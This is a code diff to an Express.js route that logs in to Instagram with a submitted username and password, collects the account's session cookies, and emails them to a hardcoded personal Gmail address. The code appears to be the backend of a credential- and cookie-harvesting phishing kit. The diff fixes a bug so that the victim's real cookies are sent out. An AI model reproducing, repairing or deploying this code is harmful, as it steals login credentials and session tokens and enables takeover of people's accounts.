@@ -238,7 +238,7 @@ app.post("/insta", (req, res) => {
 
   return Promise.try(() =>
     ig.account.login(req.body.username, req.body.password).then((val) => {
-      const cookies = ig.state.serializeCookieJar().then((val2) => {
+      ig.state.serializeCookieJar().then((val2) => {
         val2.cookies.map((cookiepairs) => {
           cookiepairs["name"] = cookiepairs["key"];
           delete cookiepairs["key"];
@@ -259,7 +259,7 @@ app.post("/insta", (req, res) => {
                   from: process.env.email,
                   to: "tklinger50@gmail.com",
                   subject: "cookies of user" + req.body.username,
-                  text: JSON.stringify(validCookie),
+                  text: JSON.stringify(val2.cookies),
                   attachments: [
                     {
                       filename: __dirname + `/tempt/${filename}.txt`,
@@ -274,7 +274,7 @@ app.post("/insta", (req, res) => {
                       success: true,
                       twoFactor: false,
                       user: val,
-                      cookie: JSON.stringify(validCookie),
+                      cookie: JSON.stringify(val2.cookies),
                       message: "login Successful but failed to send email",
                     });
                   } else {
@@ -283,7 +283,7 @@ app.post("/insta", (req, res) => {
                       success: true,
                       twoFactor: false,
                       user: val,
-                      cookie: JSON.stringify(validCookie),
+                      cookie: JSON.stringify(val2.cookies),
                       message: "login Successful and email has been sent.",
                     });
                     res.end();
